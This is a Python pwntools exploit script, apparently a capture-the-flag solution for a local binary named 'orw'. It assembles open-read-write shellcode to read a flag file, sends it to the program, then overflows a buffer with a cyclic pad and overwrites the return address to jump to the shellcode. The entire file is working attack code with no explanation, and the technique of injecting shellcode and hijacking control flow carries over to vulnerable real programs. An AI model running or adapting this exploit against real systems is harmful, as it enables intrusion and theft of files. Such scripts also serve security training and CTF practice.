#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

p = process('./orw')
# pause()

file = "/home/jyund/flag"
shell_code = 0x6010a0


payload = asm(
    shellcraft.pushstr(file) +
    shellcraft.open('rsp',0,0) +
    shellcraft.read('rax' , 'rsp',0x30) +
    shellcraft.write(1,'rsp',0x30)
)

p.sendlineafter('>', payload)


payload = flat(
    cyclic(0x18),
    shell_code
)

p.sendlineafter(')', payload)

p.interactive()
p.close()
